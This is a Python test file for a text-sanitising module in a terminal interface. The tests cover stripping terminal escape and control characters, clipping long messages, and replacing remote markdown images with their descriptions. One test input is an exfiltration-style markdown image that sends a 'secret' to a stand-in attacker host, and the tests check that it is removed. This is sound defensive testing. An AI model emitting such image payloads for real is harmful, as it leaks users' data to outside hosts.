"""Untrusted text is made safe before the cockpit shows, saves or exports it."""

from __future__ import annotations

from fund.tui.safe_text import MAX_MESSAGE_CHARS, clip, defang_markdown, strip_control


def test_escape_and_c1_control_characters_are_removed() -> None:
    """Everything a terminal would act on goes."""
    assert strip_control("a\x1b]0;t\x07b\x9b31mc\x00d") == "a]0;tb31mcd"


def test_line_feeds_and_tabs_are_kept_and_carriage_returns_dropped() -> None:
    """Layout survives; a Windows line ending becomes a plain one."""
    assert strip_control("a\tb\r\nc\n") == "a\tb\nc\n"


def test_text_within_the_limit_is_returned_as_it_is() -> None:
    """Clipping does nothing to a normal message."""
    assert clip("hello") == "hello"
    assert clip("x" * MAX_MESSAGE_CHARS) == "x" * MAX_MESSAGE_CHARS


def test_text_past_the_limit_is_cut_and_says_how_much() -> None:
    """The reader is told that something was left out."""
    clipped = clip("x" * (MAX_MESSAGE_CHARS + 7))

    assert clipped.startswith("x" * MAX_MESSAGE_CHARS)
    assert "7 more characters" in clipped


def test_a_remote_image_in_markdown_is_replaced_by_its_description() -> None:
    """A preview of an exported file cannot be made to fetch an address."""
    text = "see ![the chart](https://evil.example/?d=secret) here and ![](http://x/y)"

    safe = defang_markdown(text)

    assert "evil.example" not in safe
    assert "http://x/y" not in safe
    assert "[image: the chart]" in safe


def test_ordinary_links_and_text_are_left_alone() -> None:
    """Only embedded images are neutralised."""
    text = "read [the docs](https://example.org/a) and **more**"

    assert defang_markdown(text) == text
